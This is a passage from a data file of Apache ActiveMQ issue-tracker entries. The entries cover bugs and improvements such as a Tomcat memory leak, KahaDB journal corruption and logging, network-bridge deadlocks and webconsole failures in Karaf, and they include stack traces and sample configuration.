org.apache.activemq.broker.BrokerService.start(BrokerService.java:622)        at org.apache.activemq.osgi.ActiveMQServiceFactory.updated(ActiveMQServiceFactory.java:140)        - locked <0x000000072bd74db0> (a org.apache.activemq.osgi.ActiveMQServiceFactory)        at Proxy8890d2d1_e3a3_4b71_a7a0_88810df56856.updated(Unknown Source)        at org.apache.felix.cm.impl.helper.ManagedServiceFactoryTracker.updated(ManagedServiceFactoryTracker.java:159)        at org.apache.felix.cm.impl.helper.ManagedServiceFactoryTracker.provideConfiguration(ManagedServiceFactoryTracker.java:93)        at org.apache.felix.cm.impl.ConfigurationManager$ManagedServiceFactoryUpdate.provide(ConfigurationManager.java:1597)        at org.apache.felix.cm.impl.ConfigurationManager$ManagedServiceFactoryUpdate.run(ConfigurationManager.java:1540)        at org.apache.felix.cm.impl.UpdateThread.run(UpdateThread.java:103)        at java.lang.Thread.run(Thread.java:745) "Thread-4" #19 daemon prio=5 os_prio=0 tid=0x00007f7940002800 nid=0x7081 runnable [0x00007f79984b4000]   java.lang.Thread.State: RUNNABLE        at java.net.PlainSocketImpl.socketAccept(Native Method)        at java.net.AbstractPlainSocketImpl.accept(AbstractPlainSocketImpl.java:409)        at java.net.ServerSocket.implAccept(ServerSocket.java:545)        at java.net.ServerSocket.accept(ServerSocket.java:513)        at org.apache.karaf.main.ShutdownSocketThread.run(ShutdownSocketThread.java:56) "Thread-3" #18 prio=5 os_prio=0 tid=0x00007f79d0c48800 nid=0x7080 waiting on condition [0x00007f79985b5000]   java.lang.Thread.State: TIMED_WAITING (sleeping)        at java.lang.Thread.sleep(Native Method)        at org.apache.karaf.main.Main.doMonitor(Main.java:299)        at org.apache.karaf.main.Main.access$100(Main.java:65)        at org.apache.karaf.main.Main$1.run(Main.java:275) "FelixStartLevel" #17 daemon prio=5 os_prio=0 tid=0x00007f79d0c48000 nid=0x707f waiting for monitor entry [0x00007f79986b5000]   java.lang.Thread.State: BLOCKED (on object monitor)        at org.apache.activemq.osgi.ActiveMQServiceFactory.destroy(ActiveMQServiceFactory.java:173)        - waiting to lock <0x000000072bd74db0> (a org.apache.activemq.osgi.ActiveMQServiceFactory)        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)        at java.lang.reflect.Method.invoke(Method.java:498)        at org.apache.aries.blueprint.utils.ReflectionUtils.invoke(ReflectionUtils.java:299)        at org.apache.aries.blueprint.container.BeanRecipe.invoke(BeanRecipe.java:980)        at org.apache.aries.blueprint.container.BeanRecipe.destroy(BeanRecipe.java:887)        at org.apache.aries.blueprint.container.BlueprintRepository.destroy(BlueprintRepository.java:329)        at org.apache.aries.blueprint.container.BlueprintContainerImpl.destroyComponents(BlueprintContainerImpl.java:765)        at org.apache.aries.blueprint.container.BlueprintContainerImpl.tidyupComponents(BlueprintContainerImpl.java:964)        at org.apache.aries.blueprint.container.BlueprintContainerImpl.destroy(BlueprintContainerImpl.java:909)        at org.apache.aries.blueprint.container.BlueprintExtender$3.run(BlueprintExtender.java:325)        at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511)        at java.util.concurrent.FutureTask.run(FutureTask.java:266)        at org.apache.aries.blueprint.container.BlueprintExtender.destroyContainer(BlueprintExtender.java:346)        at org.apache.aries.blueprint.container.BlueprintExtender.modifiedBundle(BlueprintExtender.java:238)        at org.apache.aries.util.tracker.hook.BundleHookBundleTracker$Tracked.customizerModified(BundleHookBundleTracker.java:500)        at org.apache.aries.util.tracker.hook.BundleHookBundleTracker$Tracked.customizerModified(BundleHookBundleTracker.java:433)        at org.apache.aries.util.tracker.hook.BundleHookBundleTracker$AbstractTracked.track(BundleHookBundleTracker.java:725)        at org.apache.aries.util.tracker.hook.BundleHookBundleTracker$Tracked.bundleChanged(BundleHookBundleTracker.java:463)        at org.apache.aries.util.tracker.hook.BundleHookBundleTracker$BundleEventHook.event(BundleHookBundleTracker.java:422)        at org.apache.felix.framework.util.SecureAction.invokeBundleEventHook(SecureAction.java:1103)        at org.apache.felix.framework.util.EventDispatcher.createWhitelistFromHooks(EventDispatcher.java:695)        at org.apache.felix.framework.util.EventDispatcher.fireBundleEvent(EventDispatcher.java:483)        at org.apache.felix.framework.Felix.fireBundleEvent(Felix.java:4403)        at org.apache.felix.framework.Felix.stopBundle(Felix.java:2520)        at org.apache.felix.framework.Felix.setActiveStartLevel(Felix.java:1309)        at org.apache.felix.framework.FrameworkStartLevelImpl.run(FrameworkStartLevelImpl.java:304)        at java.lang.Thread.run(Thread.java:745)
issueID:AMQ-6602
type:Bug
changed files:
texts:Memory leak when undeploying webapp with ActiveMQ client
I have a web app with an ActiveMQ client. When undeploying the app, Tomcat logs the following messages.15-Feb-2017 17:53:31.760 WARNING [localhost-startStop-2] org.apache.catalina.loader.WebappClassLoaderBase.clearReferencesThreads The web application [Engine] appears to have started a thread named [ActiveMQ Session: ID:comp-41144-1487186920452-1:1:3] but has failed to stop it. This is very likely to create a memory leak. Stack trace of thread: java.lang.Object.wait(Native Method) java.lang.Object.wait(Object.java:502) org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:119) org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:42)15-Feb-2017 17:53:31.761 WARNING [localhost-startStop-2] org.apache.catalina.loader.WebappClassLoaderBase.clearReferencesThreads The web application [Engine] appears to have started a thread named [ActiveMQ Session: ID:comp-41144-1487186920452-1:1:2] but has failed to stop it. This is very likely to create a memory leak. Stack trace of thread: java.lang.Object.wait(Native Method) java.lang.Object.wait(Object.java:502) org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:119) org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:42)15-Feb-2017 17:53:31.762 WARNING [localhost-startStop-2] org.apache.catalina.loader.WebappClassLoaderBase.clearReferencesThreads The web application [Engine] appears to have started a thread named [ActiveMQ Session: ID:comp-41144-1487186920452-1:1:4] but has failed to stop it. This is very likely to create a memory leak. Stack trace of thread: java.lang.Object.wait(Native Method) java.lang.Object.wait(Object.java:502) org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:119) org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:42)15-Feb-2017 17:53:31.762 WARNING [localhost-startStop-2] org.apache.catalina.loader.WebappClassLoaderBase.clearReferencesThreads The web application [Engine] appears to have started a thread named [ActiveMQ Session: ID:comp-41144-1487186920452-1:1:10] but has failed to stop it. This is very likely to create a memory leak. Stack trace of thread: java.lang.Object.wait(Native Method) java.lang.Object.wait(Object.java:502) org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:119) org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:42)15-Feb-2017 17:53:31.763 WARNING [localhost-startStop-2] org.apache.catalina.loader.WebappClassLoaderBase.clearReferencesThreads The web application [Engine] appears to have started a thread named [ActiveMQ Session: ID:comp-41144-1487186920452-1:1:6] but has failed to stop it. This is very likely to create a memory leak. Stack trace of thread: java.lang.Object.wait(Native Method) java.lang.Object.wait(Object.java:502) org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:119) org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:42)Feb 15, 2017 5:53:31 PM org.apache.catalina.core.ApplicationContext logINFO: Closing Spring root WebApplicationContext
issueID:AMQ-6603
type:Bug
changed files:
texts:Excessive number of consumers when used with PooledConnectionFactory and Failover transport
When PooledConnectionFactory is used with Failover transport, insufficient access control settings on the broker result in an excessive number of consumer objects on the broker once the access control settings are properly set. Here is an example Spring XML configuration:<beans ...>  <bean id="jmsConnectionFactory" class="org.apache.activemq.ActiveMQConnectionFactory">    <property name="brokerURL" value="failover:(tcp://localhost:61616)" />    <property name="userName" value="test" />    <property name="password" value="test" />  </bean>  <bean id="pooledConnectionFactory" class="org.apache.activemq.pool.PooledConnectionFactory">    <property name="connectionFactory" ref="jmsConnectionFactory" />    <property name="maxConnections" value="10" />  </bean>  <bean id="jmsContainer" class="org.springframework.jms.listener.DefaultMessageListenerContainer">    <property name="connectionFactory" ref="pooledConnectionFactory" />    <property name="destinationName" value="TEST" />    <property name="messageListener" ref="messageListener" />    <property name="concurrentConsumers" value="10" />  </bean>  <bean id="messageListener" class="com.redhat.issues.amq.SpringJmsConsumer" /></beans>In this configuration we expect only one connection and 10 consumers for TEST queue, but after following the reproducer steps we see around 10 connections and 100 consumers for the queue on hawtio. In the above configuration Spring DMLC is used but we can reproduce the issue without Spring.
issueID:AMQ-6605
type:Bug
changed files:
texts:Webconsole does not work in karaf 4.1.0 because of missing tag libs
The tag libs do not seem to work in karaf 4.1.0.So the pages show the raw <c:out> tags and similar.
issueID:AMQ-6606
type:Bug
changed files:
texts:Journal partial write can result in batch corruption on restart
Recovery checking on kahadb will ignore a partial journal write at the end of the journal. However repeated write errors increment the write offset and if a subsequent write succeeds recovery fails reporting a corrupt block. MessageDatabase  | emq.store.kahadb.MessageDatabase | Detected corrupt journal files. [34:43883209 >= key < 34:47226069]One scenario is write failure for no space followed by gc which allows subsequent writes to complete.A failed write or sync should fail with an exception and should revert any offset increment such that a subsequent write reuses that offset, avoiding a partial write corruption.
issueID:AMQ-661
type:Bug
changed files:AuthorizationBroker.java
texts:ClassCastException when jaasAuthenticationPlugin is used with broker networks
Reported at:http://www.nabble.com/jaas-t1335403.html#a3568111
issueID:AMQ-6610
type:Bug
changed files:BrokerService.java
texts:Runtime configuration - Network connector is not getting registred after the config change
Runtime configuration - The network connectors reload is not registering the Network connector Mbean
issueID:AMQ-6614
type:Bug
changed files:
texts:JMX Queue attribute blockedSends not updated when a sync send hits flow control
an async send that blocks waiting for space increments the blockedSends jmx attribute but with the producerwindow or a sync send it does not.
issueID:AMQ-662
type:Bug
changed files:ActiveMQSession.java
ActiveMQSessionExecutor.java
texts:Infinite Loop after message resend
when a runtime exception in onMessage the messages are getting rolledback/resent as expected, however AMQ appears to go into an infinite loop at this point taking up 100% of the CPU. Turning debug on shows the following repeated:...&#91;DEBUG&#93; 2006-03-21 16:55:37,586 - org.apache.activemq.ra.ServerSessionImpl:1 (ServerSessionImpl.java:159)- run loop start&#91;DEBUG&#93; 2006-03-21 16:55:37,586 - org.apache.activemq.ra.ServerSessionImpl:3 (ServerSessionImpl.java:172)- run loop end&#91;DEBUG&#93; 2006-03-21 16:55:37,586 - org.apache.activemq.ra.ServerSessionImpl:22 (ServerSessionImpl.java:172)- run loop end&#91;DEBUG&#93; 2006-03-21 16:55:37,586 - org.apache.activemq.ra.ServerSessionImpl:11 (ServerSessionImpl.java:159)- run loop start&#91;DEBUG&#93; 2006-03-21 16:55:37,586 - org.apache.activemq.ra.ServerSessionImpl:0 (ServerSessionImpl.java:172)- run loop end&#91;DEBUG&#93; 2006-03-21 16:55:37,586 - org.apache.activemq.ra.ServerSessionImpl:17 (ServerSessionImpl.java:172)- run loop end&#91;DEBUG&#93; 2006-03-21 16:55:37,586 - org.apache.activemq.ra.ServerSessionImpl:1 (ServerSessionImpl.java:172)- run loop end The resend (and resulting infinte loop) was triggered by throwing a RuntimeException in the onMessage method of the POJO MDB.This is being used alongside Spring 1.2.7, Jencks 1.1.1 in a POJO message driven bean setup. Attached are the configurations producing the error.
issueID:AMQ-6620
type:Bug
changed files:
texts:Creating queue and sending message don&#39;t work from Webconsole in Karaf
Steps to reproduce this issue:1) start Karaf 4.1.0 (also change "127.0.0.1" to "0.0.0.0" in the etc/org.apache.karaf.management.cfg to make sure remove JMX working)2) install Activemq broker and webconsole into karaffeature:repo-add activemq 5.14.4feature:install activemq-broker3) open http://localhost:8181/activemqweb/ from a Browser, try to create a Queue and send message to this queue from UIThen the Name of the queue couldn"t be shown on the page and consequently the "Send To" page doesn"t work.(The Standalong AMQ 5.14.4 Webconsle works well as expected)
issueID:AMQ-6621
type:Task
changed files:
texts:Update NOTICE files with proper date and remove XMPP attribution
The dates are incorrect in the NOTICE files and there"s an old attribution for some XMPP bits we no longer have in the source tree.
issueID:AMQ-6623
type:Improvement
changed files:pom.xml
UnmodifiableLink.java
texts:update to proton-j 0.19.0
update to latest proton-j release
issueID:AMQ-6625
type:Bug
changed files:
texts:IOException in kahaDB needs to pause pending IOExceptionHandler intervention
KahaDB can recover from kill -9 by replaying the journal from the last checkpoint or by detecting and reapplying partial writes to the index.However this activity is compromised if the journal or index accepts subsequent writes. It an lead to skipped write batches or skipped partial updates to the index.The desirable behaviour of treating an IOException as fatal and stopping the broker in the knowledge that it will restart and fully recover needs to treat the first IO error as fatal and by default not accept any further writes.A more advanced IOException handler can facilitate staying alive in more specific scenarios and reactivate kahadb.
issueID:AMQ-6629
type:Improvement
changed files:EmbeddedActiveMQBroker.java
texts:Enable JMX stats on EmbeddedActiveMQBroker in activemq-junit
In EmbeddedActiveMQBroker the default disables JMX but that makes it harder for a test to collect broker stats, instead enabling JMX but turning of creation of a management connector allows for stats but won"t interfere with other brokers that have a connector running.
issueID:AMQ-663
type:Improvement
changed files:SubscriptionView.java
SubscriptionViewMBean.java
texts:JMX management info about subscriptions is incomplete
When I"m viewing my current subscriptions via jconsole, the info about them is incomplete and doesn"t mention (at least) whether they are durable or retroactive. There are probably other properties missing?
issueID:AMQ-6630
type:Task
changed files:
texts:AMQP: Update Qpid JMS to latest 0.23.0 release and match its netty version 4.1.9.Final
Update to latest Qpid JMS release and match the Netty version
issueID:AMQ-6638
type:Improvement
changed files:
texts:isHeaderValid doesn&#39;t log reasons
AmqpWireFormat#isHeaderValid has four branches in which it returns "false" == "not valid".There"s no logging in any of these four cases. As a beginner user it"s nearly impossible to guess what exactly the problem is.Some logging including reasons would go a long way, make things more accessible, and save time.Related items: https://stackoverflow.com/questions/43038083/activemq-vs-amqp-net-lite-versions https://github.com/Azure/amqpnetlite/issues/201
issueID:AMQ-664
type:Improvement
changed files:
texts:Messages sent via STOMP don&#39;t have a correct JMSTimestamp.
Messages sent via STOMP have no correct JMSTimestamp specified.  (Or that"s what jconsole indicates)
issueID:AMQ-6640
type:Bug
changed files:
texts:network of brokers, duplex connector, network consumers not registered on destination - hung bridge
Occasional hang in a network bridge under heavy load with large pending backlog across multiple destinations.Hung network bridge threads blocked through crosstalk between consumer demand and message forwarding traffic leading to blocked writes.Stack traces of the form, Broker1~~~"ActiveMQ Transport: tcp:///XXXX:51460@61616" daemon prio=10 tid=0x00007efbbc011000 nid=0x42be waiting on condition [0x00007efbb1a58000]   java.lang.Thread.State: WAITING (parking) at sun.misc.Unsafe.park(Native Method) - parking to wait for  <0x00000000c61a2118> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject) at java.util.concurrent.locks.LockSupport.park(LockSupport.java:186) at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2043) at java.util.concurrent.ArrayBlockingQueue.take(ArrayBlockingQueue.java:374) at org.apache.activemq.transport.FutureResponse.getResult(FutureResponse.java:48) at org.apache.activemq.transport.ResponseCorrelator.request(ResponseCorrelator.java:87) at org.apache.activemq.network.DemandForwardingBridgeSupport.addSubscription(DemandForwardingBridgeSupport.java:914) at org.apache.activemq.network.DemandForwardingBridgeSupport.addConsumerInfo(DemandForwardingBridgeSupport.java:1187) at org.apache.activemq.network.DemandForwardingBridgeSupport.serviceRemoteConsumerAdvisory(DemandForwardingBridgeSupport.java:772) - locked <0x00000000c25ed058> (a java.net.URI) at org.apache.activemq.network.DemandForwardingBridgeSupport.serviceRemoteCommand(DemandForwardingBridgeSupport.java:623) at org.apache.activemq.network.DemandForwardingBridgeSupport$3.onCommand(DemandForwardingBridgeSupport.java:225) at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116) at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:125) at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:300) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196) at java.lang.Thread.run(Thread.java:724)~~~~~~Dump 1 : "ActiveMQ VMTransport: vm://broker1#8-2" daemon prio=10 tid=0x00007efbbc11b800 nid=0x42c4 runnable [0x00007efbb1554000]    java.lang.Thread.State: RUNNABLE    at java.net.SocketOutputStream.socketWrite0(Native Method)    at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:109)    at java.net.SocketOutputStream.write(SocketOutputStream.java:153)    at org.apache.activemq.transport.tcp.TcpBufferedOutputStream.flush(TcpBufferedOutputStream.java:115)    at java.io.DataOutputStream.flush(DataOutputStream.java:123)    at org.apache.activemq.transport.tcp.TcpTransport.oneway(TcpTransport.java:176)    at org.apache.activemq.transport.AbstractInactivityMonitor.doOnewaySend(AbstractInactivityMonitor.java:334)    at org.apache.activemq.transport.AbstractInactivityMonitor.oneway(AbstractInactivityMonitor.java:316)    at org.apache.activemq.transport.TransportFilter.oneway(TransportFilter.java:85)    at org.apache.activemq.transport.WireFormatNegotiator.oneway(WireFormatNegotiator.java:116)    at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:68)    at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60)    at org.apache.activemq.network.DemandForwardingBridgeSupport.serviceLocalCommand(DemandForwardingBridgeSupport.java:994)    at org.apache.activemq.network.DemandForwardingBridgeSupport$2.onCommand(DemandForwardingBridgeSupport.java:207)    at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116)    at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)    at org.apache.activemq.transport.vm.VMTransport.iterate(VMTransport.java:271)    at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:133)    at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:48)    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)    at java.lang.Thread.run(Thread.java:724)~~~While the broker2 on the other side of the duplex network has threads in the following state:~~~~Thread 1:"ActiveMQ Transport: tcp:XXXX:61616@51460" prio=10 tid=0x00007f8a6055b000 nid=0x42bd waiting on condition [0x00007f8a40f8a000]    java.lang.Thread.State: WAITING (parking)    at sun.misc.Unsafe.park(Native Method)    - parking to wait for  <0x00000000c8d5e000> (a java.util.concurrent.locks.ReentrantLock$NonfairSync)    at java.util.concurrent.locks.LockSupport.park(LockSupport.java:186)    at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:834)    at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireQueued(AbstractQueuedSynchronizer.java:867)    at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1197)    at java.util.concurrent.locks.ReentrantLock$NonfairSync.lock(ReentrantLock.java:214)    at java.util.concurrent.locks.ReentrantLock.lock(ReentrantLock.java:290)    at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:66)    at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60)    at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1457)    at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:971)    at org.apache.activemq.broker.TransportConnection.dispatchSync(TransportConnection.java:927)    at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:192)    at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116)    at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)    at org.apache.activemq.transport.vm.VMTransport.doDispatch(VMTransport.java:162)    at org.apache.activemq.transport.vm.VMTransport.dispatch(VMTransport.java:154)    - locked <0x00000000c8db5498> (a java.util.concurrent.atomic.AtomicBoolean)    at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:131)    at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:68)    at org.apache.activemq.transport.ResponseCorrelator.asyncRequest(ResponseCorrelator.java:81)    at org.apache.activemq.transport.ResponseCorrelator.request(ResponseCorrelator.java:86)    at org.apache.activemq.network.DemandForwardingBridgeSupport.addSubscription(DemandForwardingBridgeSupport.java:914)    at org.apache.activemq.network.DemandForwardingBridgeSupport.addConsumerInfo(DemandForwardingBridgeSupport.java:1187)    at org.apache.activemq.network.DemandForwardingBridgeSupport.serviceRemoteConsumerAdvisory(DemandForwardingBridgeSupport.java:772)    - locked <0x00000000c0715280> (a java.net.URI)    at org.apache.activemq.network.DemandForwardingBridgeSupport.serviceRemoteCommand(DemandForwardingBridgeSupport.java:623)    at org.apache.activemq.network.DemandForwardingBridgeSupport$3.onCommand(DemandForwardingBridgeSupport.java:225)    at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116)    at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)    at org.apache.activemq.transport.failover.FailoverTransport.processCommand(FailoverTransport.java:207)    at org.apache.activemq.transport.failover.FailoverTransport.access$1100(FailoverTransport.java:72)    at org.apache.activemq.transport.failover.FailoverTransport$3.onCommand(FailoverTransport.java:216)    at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:125)    at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:300)    at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)    at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214)    at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196)    at java.lang.Thread.run(Thread.java:724)~~~~Thread 2:~~~~"ActiveMQ BrokerService[broker_2] Task-32137" daemon prio=10 tid=0x00007f8a6067d800 nid=0x244f runnable [0x00007f8a4bbb9000]    java.lang.Thread.State: RUNNABLE    at java.net.SocketOutputStream.socketWrite0(Native Method)    at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:109)    at java.net.SocketOutputStream.write(SocketOutputStream.java:153)    at org.apache.activemq.transport.tcp.TcpBufferedOutputStream.flush(TcpBufferedOutputStream.java:115)    at java.io.DataOutputStream.flush(DataOutputStream.java:123)    at org.apache.activemq.transport.tcp.TcpTransport.oneway(TcpTransport.java:176)    at org.apache.activemq.transport.AbstractInactivityMonitor.doOnewaySend(AbstractInactivityMonitor.java:334)    at org.apache.activemq.transport.AbstractInactivityMonitor.oneway(AbstractInactivityMonitor.java:316)    at org.apache.activemq.transport.TransportFilter.oneway(TransportFilter.java:85)    at org.apache.activemq.transport.WireFormatNegotiator.oneway(WireFormatNegotiator.java:116)    at org.apache.activemq.transport.failover.FailoverTransport.oneway(FailoverTransport.java:667)    - locked <0x00000000c8d777e8> (a java.lang.Object)    at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:68)    at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60)    at org.apache.activemq.network.DemandForwardingBridgeSupport.serviceLocalCommand(DemandForwardingBridgeSupport.java:994)    at org.apache.activemq.network.DemandForwardingBridgeSupport$2.onCommand(DemandForwardingBridgeSupport.java:207)    at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116)    at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)    at org.apache.activemq.transport.vm.VMTransport.doDispatch(VMTransport.java:162)    at org.apache.activemq.transport.vm.VMTransport.dispatch(VMTransport.java:154)    - locked <0x00000000c8db54b8> (a java.util.concurrent.atomic.AtomicBoolean)    at org.apache.activemq.transport.vm.VMTransport.oneway(VMTransport.java:131)    at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:68)    at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60)    at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1457)    at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:971)    at org.apache.activemq.broker.TransportConnection.iterate(TransportConnection.java:1017)    at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:133)    at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:48)    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)    at java.lang.Thread.run(Thread.java:724)~~~~
issueID:AMQ-6642
type:Bug
changed files:
texts:MessageStore update message can encounter NPE with KahaDB
If KahaDB subscription statistics have been enabled (off by default) then it"s possible to get a null pointer exception if updateMessage() is called on the message store.  This occurs if the destination is a Queue as there is not a proper null pointer check done for ackPositions which only exists when using a Topic.
issueID:AMQ-6643
type:Bug
changed files:
texts:Shared virtual topic wildcard consumers receive spurious and duplicate messages
Virtual topic wildcard subscriber queues are physical queues, however the matching of destinations to new subscriptions matches based on the wildcard destination in error. Causing subs to get subscribed in error and causing duplicate subscriptions.
issueID:AMQ-6644
type:Bug
changed files:MessageDatabase.java
texts:Incorrect logging from KahaDB cleanup task when enableAckCompaction=true
When KahaDB is configured for enableAckCompaction=true, it moves acks into a new journal file. Such journal file will only contains the compacted acks, it won"t be used to hold messages. If the actual journal (to which new messages are written to) has a lower number than the journal files that were created during ack compaction, the periodic cleanup task will not delete any journals that are higher than the actual journal file. So multiple journal files may remain active on disk although there is no single unconsumed message on the broker. This in itself is okay, however when trace logging for the cleanup task is enabled, it reports differently, namely that it is going to delete these journals, where in fact it is not deleting them.E.g. lets take the following example.The KahaDB folder on disk consists of [kahadb]$ ls -alhtotal 54Mdrwxr-xr-x.  2 fuse fuse  128K Feb  1 15:50 .drwxr-xr-x. 13 fuse fuse  4.0K Nov  4 13:14 ..-rw-r--r--.  1 fuse fuse   32M Feb  1 16:26 db-65.log-rw-r--r--.  1 fuse fuse  4.6M Feb  1 15:24 db-66.log-rw-r--r--.  1 fuse fuse  4.5M Feb  1 15:29 db-67.log-rw-r--r--.  1 fuse fuse  4.6M Feb  1 15:34 db-68.log-rw-r--r--.  1 fuse fuse  4.5M Feb  1 15:39 db-69.log-rw-r--r--.  1 fuse fuse  2.5M Feb  1 16:26 db.data-rw-r--r--.  1 fuse fuse   32M Feb  1 14:51 db-log.template-rw-r--r--.  1 fuse fuse 1002K Feb  1 16:26 db.redo-rw-r--r--.  1 fuse fuse     8 Feb  1 14:51 lockand the logging says:Last update: 65:26636520, full gc candidates set: [65, 66, 67, 68, 69]gc candidates after producerSequenceIdTrackerLocation:65, [66, 67, 68, 69]gc candidates after ackMessageFileMapLocation:65, [66, 67, 68, 69]...gc candidates: [66, 67, 68, 69]    ackMessageFileMap: {65=[65]}Cleanup removing the data files: [66, 67, 68, 69]In this example the actual journal file to which msgs are written is 65. The journal files 66-69 were created during ack compaction and have a higher number than 65.So KahaDB won"t delete the journals 66-69 until the actual journal file is moved to journal 70, despite that there are no unconsumed messages on the broker.However the last log line suggests that it will remove the journals 66-69, but they will not get removed due to rule above. We should align the logging output with the logic used to determine which journals to delete.
issueID:AMQ-6645
type:Bug
changed files:
texts:activemq:browse command does not display Header - OriginalDestination
The jmx view correctly exposes the originaDestination attribute but the browse command does not map this property in error.
issueID:AMQ-6646
type:Bug
changed files:
texts:default blob strategy error reporting should include url
Default blob upload strategy can do a little better at reporting errors by including the url such that it is clear what url in in the mix.
issueID:AMQ-6649
type:Bug
changed files:
texts:Add support for MS SQL server JDBC driver 6.1
activemq-jdbc-store-5.14.4.jar contains support of MS SQL JDBC driver 4.0.Could you upgrade to java 8 compliant MS SQL Server JDBC driver 6.1 ?As a workaround I have copied file META-INFservicesorgapacheactivemqstorejdbcmicrosoft_jdbc_driver_4_0_for_sql_server  to META-INFservicesorgapacheactivemqstorejdbcmicrosoft_jdbc_driver_6_1_for_sql_server This solution is based on AMQ-3914
issueID:AMQ-665
type:Bug
changed files:OpenTypeSupport.java
texts:Error while using management interface on messages with binary data.
I"m sending binary data through STOMP (with a content-length header).  When I go into jconsole and try to use "browse" to view the message, I get this exception on the server side:javax.management.openmbean.OpenDataException: Argument"s element itemValues&#91;7&#93;="[B@40e1f305" is not a valid value for this item (itemName=BodyPreview,itemType=javax.management.openmbean.ArrayType(name=[Ljava.lang.Byte;,dimension=1,elementType=javax.management.openmbean.SimpleType(name=java.lang.Byte))).        at javax.management.openmbean.CompositeDataSupport.<init>(CompositeDataSupport.java:145)        at javax.management.openmbean.CompositeDataSupport.<init>(CompositeDataSupport.java:190)        at org.apache.activemq.broker.jmx.OpenTypeSupport.convert(OpenTypeSupport.java:253)        at org.apache.activemq.broker.jmx.DestinationView.browse(DestinationView.java:91)        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)        at java.lang.reflect.Method.invoke(Method.java:585)        at com.sun.jmx.mbeanserver.StandardMetaDataImpl.invoke(StandardMetaDataImpl.java:414)        at com.sun.jmx.mbeanserver.MetaDataImpl.invoke(MetaDataImpl.java:220)        at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.invoke(DefaultMBeanServerInterceptor.java:815)        at com.sun.jmx.mbeanserver.JmxMBeanServer.invoke(JmxMBeanServer.java:784)        at 